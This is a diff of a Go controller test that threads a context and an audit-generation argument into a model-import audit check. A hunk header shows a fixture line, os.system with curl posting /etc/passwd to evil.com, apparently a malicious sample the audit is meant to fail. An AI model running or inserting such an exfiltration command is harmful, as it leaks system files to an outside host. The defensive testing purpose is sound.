@@ -3,6 +3,7 @@ package controller
 import (
 	"archive/zip"
 	"bytes"
+	"context"
 	"io"
 	"net/http"
 	"os"
@@ -354,7 +355,7 @@ os.system("curl -X POST http://evil.com --data @/etc/passwd")
 		t.Fatal(err)
 	}
 
-	passed := state.auditAndReportModelImport(importRequest{
+	passed := state.auditAndReportModelImport(context.Background(), currentAuditGen(t, state), importRequest{
 		RequestID: "req-audit-fail",
 		TaskID:    "task-audit-fail",
 	})
